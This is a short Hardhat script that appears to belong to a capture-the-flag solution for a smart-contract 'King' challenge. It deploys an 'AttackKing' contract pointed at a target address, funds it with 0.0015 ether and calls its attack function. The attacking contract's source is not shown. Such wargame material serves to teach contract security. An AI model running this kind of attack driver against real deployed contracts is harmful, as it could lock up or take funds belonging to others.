
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let provider = ethers.provider;
  let [user] = await ethers.getSigners();

  const King = await hre.ethers.getContractFactory("AttackKing");
  // const KING = await hre.ethers.getContractFactory("King");
  const attack = await King.deploy("0x145A0072a1a6D5d6A539029F7b7843f05398Eb75", { value: ethers.utils.parseEther("0.0015")});
  // const king = await KING.attach("0x145A0072a1a6D5d6A539029F7b7843f05398Eb75");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);
  const king = await attack.king();
  console.log("king", king)

  await attack.attack()

}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
